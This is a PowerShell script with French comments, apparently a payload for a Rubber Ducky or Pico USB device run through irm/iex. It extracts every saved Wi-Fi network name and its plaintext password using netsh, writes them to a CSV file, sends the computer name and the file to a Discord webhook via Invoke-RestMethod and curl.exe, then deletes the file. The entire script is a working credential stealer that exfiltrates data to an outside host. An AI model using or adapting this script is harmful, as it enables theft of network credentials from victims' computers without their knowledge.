# Script modifié pour exécution via irm et iex
$wifi = @()

# Commande pour obtenir les profils Wi-Fi
$cmd1 = netsh wlan show profiles

# Boucle sur chaque ligne du résultat pour extraire les SSID
ForEach ($row1 in $cmd1) {
    If ($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$') {
        $ssid = $Matches[1]
        # Commande pour obtenir le mot de passe associé
        $cmd2 = netsh wlan show profiles $ssid key=clear
        ForEach ($row2 in $cmd2) {
            If ($row2 -match 'Contenu de la c[^:]+:.(.+)$') {
                $key = $Matches[1]
                # Ajout des données au tableau
                $wifi += [PSCustomObject]@{ssid = $ssid; key = $key}
            }
        }
    }
}

# Définition du chemin pour le fichier temporaire
$path = Join-Path $env:USERPROFILE 'wifi.txt'
# Export des données Wi-Fi dans un fichier CSV
$wifi | Export-Csv -Path $path -NoTypeInformation

# URL du webhook Discord
$url = $dc

# Création du corps de la requête pour Discord
$Body = @{
    content = "$env:computername Stats from Ducky/Pico"
}

# Envoi des données Wi-Fi au webhook sous forme de message
Invoke-RestMethod -ContentType 'application/json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json)

# Envoi du fichier wifi.txt via curl.exe
Start-Process curl.exe -ArgumentList @("-F", "file1=@$path", $url) -NoNewWindow -Wait

# Suppression du fichier temporaire
Remove-Item -Path $path -Force
